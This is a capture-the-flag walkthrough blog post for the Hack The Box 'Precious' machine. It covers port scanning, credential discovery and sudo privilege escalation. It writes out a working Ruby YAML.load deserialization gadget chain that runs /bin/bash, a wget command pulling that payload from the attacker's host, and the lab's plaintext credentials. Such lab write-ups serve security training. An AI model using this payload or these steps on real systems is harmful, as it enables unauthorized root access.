---
title: "HTB - Precious Walkthrough"
date: 2023-06-11
author: Luigi Vezzoso
layout: post
tags: 
    - walkthrough
    - hackthebox
    - pentest
category: posts
---

Hi There!

here we go with a new walkthrough of Hack The Box - Precious Machine!

![precious-img](assets/postimages/precious/Precious.png)


## initial footprint
As usual, we start the analisys in a black-box mode, and we need to figure out what type of the server we have in front of us. Let's run our loved tool nmap.

{% highlight shell %}

Nmap 7.80 scan initiated Sun Feb 19 23:02:56 2023 as: nmap -p- -sV -oN precious.nmap precious.htb
Nmap scan report for precious.htb (10.10.11.189)
Host is up (0.056s latency).
Not shown: 65532 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp    open     http    nginx 1.18.0
21040/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 19 23:11:59 2023 -- 1 IP address (1 host up) scanned in 543.96 seconds
{% endhighlight %}


![precious-website](assets/postimages/precious/precious-website.png)


![precious-pdfconverte](assets/postimages/precious/local-pdfconvert.png)

![precious-generated-pdf](assets/postimages/precious/generated_pdf.png)

Already know CVE

![precious-cve](assets/postimages/precious/cve-2022-25765.png)

exploiting!

![precious-exploit](assets/postimages/precious/exploiting.png)

## Lateral moovemnt

{% highlight shell %}

$ cd /home/ruby
cd /home/ruby
$ ls -la
ls -la
total 28
drwxr-xr-x 4 ruby ruby 4096 Feb 24 15:43 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 4 ruby ruby 4096 Feb 24 15:53 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
$ cd .bundle
cd .bundle
$ ls -la
ls -la
total 12
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .
drwxr-xr-x 4 ruby ruby 4096 Feb 24 15:43 ..
-r-xr-xr-x 1 root ruby   62 Sep 26 05:04 config
$ cat config
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
$ 


xabaras@helix:~/workdir/ctf/htb/precious.htb$ ssh henry@precious.htb
henry@precious.htb's password: 
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb 24 15:57:50 2023 from 10.10.14.184
henry@precious:~$ ls -la
total 24
drwxr-xr-x 2 henry henry 4096 Oct 26 08:28 .
drwxr-xr-x 4 root  root  4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root  root     9 Sep 26 05:04 .bash_history -> /dev/null
-rw-r--r-- 1 henry henry  220 Sep 26 04:40 .bash_logout
-rw-r--r-- 1 henry henry 3526 Sep 26 04:40 .bashrc
-rw-r--r-- 1 henry henry  807 Sep 26 04:40 .profile
-rw-r----- 1 root  henry   33 Feb 24 15:43 user.txt
henry@precious:~$ 



henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
henry@precious:~$ 


{% endhighlight %}



henry@precious:~$ cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
henry@precious:~$ 


again a well-know CVE 

https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/



dependency.yml

---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: /bin/bash
         method_id: :resolve
~           



wget http://10.10.14.184:8000/dependencies.yml -O dependencies.yml


sudo /usr/bin/ruby /opt/update_dependencies.rb



henry@precious:/tmp/.xab$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
root@precious:/tmp/.xab# id
uid=0(root) gid=0(root) groups=0(root)
root@precious:/tmp/.xab# 
















